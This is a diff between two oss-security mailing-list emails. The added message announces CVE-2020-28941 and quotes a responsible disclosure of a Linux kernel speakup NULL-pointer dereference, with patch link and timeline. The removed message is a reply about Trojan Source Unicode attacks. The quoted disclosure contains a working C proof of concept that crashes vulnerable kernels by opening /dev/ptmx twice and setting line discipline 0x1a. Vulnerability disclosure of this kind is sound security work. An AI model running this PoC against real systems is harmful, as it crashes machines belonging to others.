@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1217" "Tuesday" "2" "November" "2021" "02:21:58" "+0100" "Jan Engelhardt" "jengelh@inai.de" nil "26" "Re: [oss-security] Trojan Source Attacks" nil nil nil "11" nil nil (number mark "U       jengelh@inai Nov  2   26/1217  " thread-indent "\"Re: [oss-security] Trojan Source Attacks\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] Trojan Source Attacks" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2286" "Thursday" "19" "November" "2020" "17:25:08" "+0100" "Marcus Meissner" "meissner@suse.de" "<20201119162507.GA4986@suse.de>" "68" "Re: [oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_ldisc_close" nil nil nil "11" "2020111916:25:08" "[oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_ldisc_close" (number mark "U       meissner@sus Nov 19   68/2286  " thread-indent "\"Re: [oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_ldisc_close\"\n") "<CAM1BPE6J_heHs_ckMm5u_Pv6Wnssv_3wgiCNBJs+HLQ+4qkC4A@mail.gmail.com>" ("<CAM1BPE6J_heHs_ckMm5u_Pv6Wnssv_3wgiCNBJs+HLQ+4qkC4A@mail.gmail.com>") nil nil nil nil nil nil nil "Re: [oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_ldisc_close" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 3272 invoked by uid 550); 2 Nov 2021 06:22:13 -0000
+Received: (qmail 6015 invoked by uid 550); 19 Nov 2020 15:25:30 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,42 +12,91 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 23892 invoked from network); 2 Nov 2021 01:22:09 -0000
-Date: Tue, 2 Nov 2021 02:21:58 +0100 (CET)
-From: Jan Engelhardt <jengelh@inai.de>
-To: "Perry E. Metzger" <perry@piermont.com>
-cc: oss-security@lists.openwall.com
-In-Reply-To: <58836a21-c9df-41cc-d6ea-edd7b01f2105@piermont.com>
-Message-ID: <4rs9o8oo-3q9s-1276-r921-6r9n436o758@vanv.qr>
-References: <c2d12374-0ed6-d6d4-60ea-799934b6f173@cl.cam.ac.uk> <3n67pqq3-9ro6-p138-npo0-n4314s77638n@vanv.qr> <58836a21-c9df-41cc-d6ea-edd7b01f2105@piermont.com>
-User-Agent: Alpine 2.25 (LSU 592 2021-09-18)
+Received: (qmail 5950 invoked from network); 19 Nov 2020 15:25:29 -0000
+X-Virus-Scanned: by amavisd-new at test-mx.suse.de
+Date: Thu, 19 Nov 2020 17:25:08 +0100
+From: Marcus Meissner <meissner@suse.de>
+To: oss-security@lists.openwall.com
+Cc: nopitydays@gmail.com
+Message-ID: <20201119162507.GA4986@suse.de>
+References: <CAM1BPE6J_heHs_ckMm5u_Pv6Wnssv_3wgiCNBJs+HLQ+4qkC4A@mail.gmail.com>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=US-ASCII
-Subject: Re: [oss-security] Trojan Source Attacks
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <CAM1BPE6J_heHs_ckMm5u_Pv6Wnssv_3wgiCNBJs+HLQ+4qkC4A@mail.gmail.com>
+Organization: SUSE Software Solutions =?iso-8859-1?Q?Ger?=
+ =?iso-8859-1?Q?many_GmbH=2C_Maxfeldstr=2E_5=2C_90409_Nuernberg=2C_Germany?=
+ =?iso-8859-1?Q?=2C_GF=3A_Felix_Imend=F6rffer=2C_HRB_36809=2C_AG_N=FCrnber?=
+ =?iso-8859-1?Q?g?=
+User-Agent: Mutt/1.10.1 (2018-07-13)
+Subject: Re: [oss-security] Linux kernel NULL-ptr deref bug in
+ spk_ttyio_ldisc_close
 
-On Tuesday 2021-11-02 00:50, Perry E. Metzger wrote:
+Hi,
 
-> On 11/1/21 16:51, Jan Engelhardt wrote:
->>> We have identified an issue affecting all compilers and interpreters that
->>> support Unicode.
->>> [...]
->>> The attached paper describes an attack paradigm -- which we believe to be
->>> novel -- discovered by security researchers at the
->>> University of Cambridge.
->> Not so novel. At one time, this picture made the rounds
->> (https://twitter.com/acronis/status/1019152990022787072 - the pic is likely
->> older than this 2018 tweet), and anyone who knew that Unicode had zero-width
->> characters already made the connection.
->
-> If it was known to everyone, then why are so many language interpreters and
-> compilers impacted? [...] (Claims that people who write
-> compilers are fools will be cheerfully ignored.)
+Mitre has assigned CVE-2020-28941 to this issue.
 
-Perhaps a case of "not my problem".
+Ciao, Marcus
+On Thu, Nov 19, 2020 at 10:46:59AM +0800, Shisong Qin wrote:
+> Hi,
+> 
+> Recently we found a NULL-ptr deref BUG in spk_ttyio.c in the longterm 4.19
+> Linux kernel, and it could also be triggered in the 5.9 Linux kernel. In
+> function spk_ttyio_ldisc_close, it would free the "speakup_tty->disc_data"
+> and set "speakup_tty" to NULL. However, if we open two tty device and use
+> tiocsetd() to set them as "speakup_tty" and close them in turn, the first
+> close would set "speakup_tty" to NULL, and in the second close would try to
+> dereference the "speakup_tty", leading to a NULL-ptr deref crash.
+> 
+> This bug could be reproduced in the longterm 4.19 Linux kernel with
+> CONFIG_STAGING=y, CONFIG_SPEAKUP=y and CONFIG_KASAN=y.
+> To reproduce it in the 5.9 Linux kernel, CONFIG_ACCESSIBILITY=y is also
+> required in config, and here is a simple poc:
+> 
+> #define _GNU_SOURCE
+> 
+> #include <dirent.h>
+> #include <endian.h>
+> #include <errno.h>
+> #include <fcntl.h>
+> #include <signal.h>
+> #include <stdarg.h>
+> #include <stdbool.h>
+> #include <stdint.h>
+> #include <stdio.h>
+> #include <stdlib.h>
+> #include <string.h>
+> #include <sys/prctl.h>
+> #include <sys/stat.h>
+> #include <sys/syscall.h>
+> #include <sys/types.h>
+> #include <sys/wait.h>
+> #include <time.h>
+> #include <unistd.h>
+> 
+> int main(void) {
+>     int disc = 0x1a;
+>     int fd = open("/dev/ptmx", O_RDWR, 0);
+>     ioctl(fd, 0x5423, &disc);
+>     int fd2 = open("/dev/ptmx", O_RDWR, 0);
+>     ioctl(fd2, 0x5423, &disc);
+>     return 0;
+> }
+> 
+> After the process return, it seems the automated calling to release would
+> trigger the NULL-ptr deref bug.
+> 
+> Here is the commit to patch this BUG:
+> https://git.kernel.org/pub/scm/linux/kernel/git/gregkh/tty.git/commit/?h=tty-linus&id=d4122754442799187d5d537a9c039a49a67e57f1
+> 
+> Timeline:
+> * 2020/11/10 - Vulnerability reported to security@kernel.org
+> * 2020/11/11 - Vulnerability confirmed, and reported to
+> linux-distros@vs.openwall.org.
+> * 2020/11/19 - Vulnerability opened.
+> 
+> Thanks,
+> Shisong Qin and Bodong Zhao, Tsinghua University
 
-The filesystem layer of many an operating system does not care about filenames.
-The only rules, if any, are the special meaning of the hierarchy separator (if
-any) and perhaps a string terminator (if any).
-
-Compilers - could be the same thing. As long as the grammar is satisfied,
-why should they bother what comes in. ("Write/use better editors and frontends")
+-- 
+Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi. 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <meissner@suse.de>
